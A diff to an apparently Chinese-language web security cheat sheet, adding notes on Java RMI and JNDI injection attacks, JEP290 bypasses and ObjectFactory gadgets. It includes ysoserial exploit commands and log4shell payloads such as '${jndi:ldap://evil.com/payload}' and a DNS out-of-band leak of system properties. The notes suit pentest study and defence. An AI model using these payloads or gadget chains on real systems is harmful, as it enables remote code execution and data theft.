@@ -2839,6 +2839,37 @@ print marshalled
     - `readObject()`
     - `readExternal()`
     - ...
+- RMI
+    - 攻擊情境
+        - Client 打 Registry
+            - lookup
+        - Server 打 Registry
+            - bind/unbind/rebind
+        - ...
+    - 攻擊路徑與版本限制
+        - `list`
+            - 可以探測 RMI endpoint
+            - 工具: BaRMIe
+        - `lookup`
+            - ~8u121: 直接打反序列化
+            - 8u121 ~ 8u232: UnicastRef + JRMPListener (JEP290 Bypass)
+            - 8u232 ~ 8u242: UnicastRefRemoteObject + JRMPListener (JEP290 Bypass)
+        - `bind`/`unbind`/`rebind`
+            - 8u141 前，先反序列化才檢查來源，可強制反序列化
+                - ~8u121: 直接 bind/rebind 反序列化
+                - 8u121 ~ 8u141: bind/rebind 配合 JRMP 反序列化 (JEP290 Bypass)
+            - ysoserial 的 `RMIRegistryExploit` 即是打 `bind`
+                - `java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections7 "open /System/Applications/Calculator.app"`
+        - 打 DGC 層
+            - 8u121 後，受 JEP290 限制無法打
+            - ysoserial 的 `JRMPClient` 可以用來打 DGC
+                - `java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections7 "open /System/Applications/Calculator.app"`
+        - JEP 290 Bypass (8u121)
+            - Registry & DGC 預設被 JEP290 白名單擋
+            - 可透過 JRMP 繞過
+        - 已知 Object 類型呼叫方法
+            - 若已知 endpoint 呼叫方法，且為參數為 Object 類型，可直接打反序列化 (不受版本限制)
+        - ...
 - JEP290
     - Java 9 新特性，並向下支援到 8u121, 7u13, 6u141
     - 增加黑、白名單機制
@@ -2846,20 +2877,81 @@ print marshalled
         - JDK 包含了 Builtin Filter (白名單機制) 在 RMI Registry 和 RMI Distributed Garbage Collector
         - 只允許特定 class 被反序列化
         - 許多 RMI Payload 失效 (即便 classpath 有 gadegt)
-- Codebase
-    - JDK 6u45, 7u21 開始，`useCodebaseOnly` 預設為 true
-        - 禁止自動載入遠端 class 文件
-    - JNDI Injection
-        - JDK 6u132, 7u122, 8u113 下，`com.sun.jndi.rmi.object.trustURLCodebase`, `com.sun.jndi.cosnaming.object.trustURLCodebase` 預設為 false
-            - RMI 預設不允許從遠端 Codebase 載入 Reference class
-        - JDK 11.0.1, 8u191, 7u201, 6u211 後，`com.sun.jndi.ldap.object.trustURLCodebase` 預設為 false
-            - LDAP 預設不允許從遠端 Codebase 載入 Reference class
+- JNDI Injection
+    - 攻擊情境
+        - 攻擊者輸入拼接至 JNDI lookup 等查詢函數
+        - 反序列化轉 JNDI Injection
+        - log4shell
+        - ...
+    - 攻擊路徑與版本限制
+        - Codebase
+            - JDK 6u45, 7u21 開始，`useCodebaseOnly` 預設為 true
+                - 禁止自動載入遠端 class 文件
+            - JDK 6u132, 7u122, 8u113 下，`com.sun.jndi.rmi.object.trustURLCodebase`, `com.sun.jndi.cosnaming.object.trustURLCodebase` 預設為 false
+                - RMI 預設不允許從遠端 Codebase 載入 Reference class
+            - JDK 11.0.1, 8u191, 7u201, 6u211 後，`com.sun.jndi.ldap.object.trustURLCodebase` 預設為 false
+                - LDAP 預設不允許從遠端 Codebase 載入 Reference class
         - 高版本JDK (8u191+)
             - codebase 無法利用 (trustURLCodebase=false)
             - 可能攻擊路徑
                 - 1. 找可利用的 ObjectFactory
                     - e.g. Tomcat 下可利用 `org.apache.naming.factory.BeanFactory` + `javax.el.ELProcessor`
                 - 2. 透過 `javaSerializedData` 進行反序列化
+        - 更高版本JDK (JDK20+)
+            - 限制
+                - JDK-8290367: com.sun.jndi.ldap.object.trustSerialData=false  (by default)
+                    - JNDI Injection + LDAP 反序列化，受限制
+                - JDK-8290368: 新增 ObjectFactoriesFilter 
+                    - 本地 ObjectFactory，受限制
+            - 可能攻擊路徑
+                - 透過 RMI 打反序列化
+    - ObjectFactory Gadgets
+        - `org.apache.naming.factory.BeanFactory`
+            - 透過 `forceString` 可執行單一字串參數的 method
+            - 常配合 `ELProcessor` or `GroovyShell` 來 RCE
+            - 限制
+                - `forceString` 在 Tomcat 9.0.63 後被移除 ([ref](https://github.com/apache/tomcat/commit/df7da6c29aace17c92fe47fe386ab14ece59b5d4))
+        - `javax.el.ELProcessor`
+            - `eval` 剛好吃一個字串參數，常配合 BeanFactory 來 RCE
+            - 限制
+                - Tomcat 8 才引入
+        - `groovy.lang.GroovyShell`
+            - 類似 ELProcessor，`evaluate` 只吃一個字串參數，常配合 BeanFactory 來 RCE
+            - 限制
+                - 需環境有 Groovy 相依
+        - `org.apache.commons.configuration2.SystemConfiguration` / `org.apache.commons.configuration.SystemConfiguration`
+            - `setSystemProperties` method 可以設定系統屬性
+            - `fileName` 可以傳入本地文件，也可以是遠端請求
+            - 可以透過此方法修改系統屬性，來繞過防禦限制
+                - 例如 `org.apache.commons.collections.enableUnsafeSerialization=true` 繞反序列化限制
+        - `org.yaml.snakeyaml.Yaml`
+            - `load` method 透過 SPI 載入遠端 jar/class 來 RCE
+            - 常配合 BeanFactory 一起使用
+        - `org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory`
+            - 類似 BeanFactory，可以呼叫類別的所有 set 開頭的方法
+            - 可以結合 `SystemConfiguration` 修改系統屬性
+        - ... and more
+    - log4shell
+        - Payload
+            - `${jndi:ldap://evil.com/payload}` (same as normal jndi injection)
+            - `${jndi:ldap://${sys:java.version}.dns.evil.com/a}` (leak java version by dns oob)
+                - `${sys:user.name}`
+                - `${sys:os.name}`
+                - `${sys:os.arch}`
+                - `${java:os}`
+                - `${env:USERNAME}`
+                - `${web:rootDir}`
+                - ...
+    - 反序列化轉 JNDI Injection
+        - `org.springframework.transaction.jta.JtaTransactionManager#readObject`
+            - 環境需引入 spring-tx.jar
+        - `oracle.jdbc.rowset.OracleCachedRowSet#getConnection`
+        - `com.sun.rowset.JdbcRowSetImpl`
+        - ...
+    - 其他限制
+        - rmi / ldap 被黑名單阻擋時
+            - 可嘗試 `ldaps`
+            - ref: https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html
 - Tool
     - [yososerial](https://github.com/frohoff/ysoserial)
         - URLDNS: 不依賴任何額外library，可以用來做 dnslog 驗證
@@ -4514,7 +4606,7 @@ state[i] = state[i-3] + state[i-31]`
 
 - Proxy 相關
     - Path parameters
-        - Tomcat & Jetty: `/path;param/abcd` => `/path/abcd
+        - Tomcat & Jetty: `/path;param/abcd` => `/path/abcd`
         - WebLogic & WildFly: `/path;param/abcd` => `/path`
     - Nginx + Tomcat
         - `..;`
